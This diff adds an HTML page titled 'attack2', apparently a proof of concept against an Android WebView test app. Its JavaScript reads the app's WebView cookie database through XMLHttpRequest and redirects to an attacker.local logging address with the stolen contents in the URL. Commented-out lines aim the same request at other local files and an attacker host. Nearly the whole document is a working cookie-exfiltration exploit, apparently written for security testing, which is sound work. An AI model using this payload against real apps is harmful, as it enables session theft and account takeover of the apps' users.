@@ -1,0 +1,27 @@
+<html>
+<body>
+<h1>attack2</h1>
+
+<script>
+//var aim = 'http://attacker.local:8000/lol';
+var aim = '/data/data/com.sambal0x.test/app_webview/Default/Cookies';
+//var aim = '/sdcard/test.txt';
+
+var xhr = new XMLHttpRequest();
+//xhr.onload = reqListener;
+xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4){
+                reqListener(xhr.responseText);
+        }
+};
+xhr.open('GET', aim);
+xhr.send(null);
+
+function reqListener(out) {
+        location='http://attacker.local/log?key='+out;
+        alert(out);
+};
+
+</script>
+</body>
+</html>
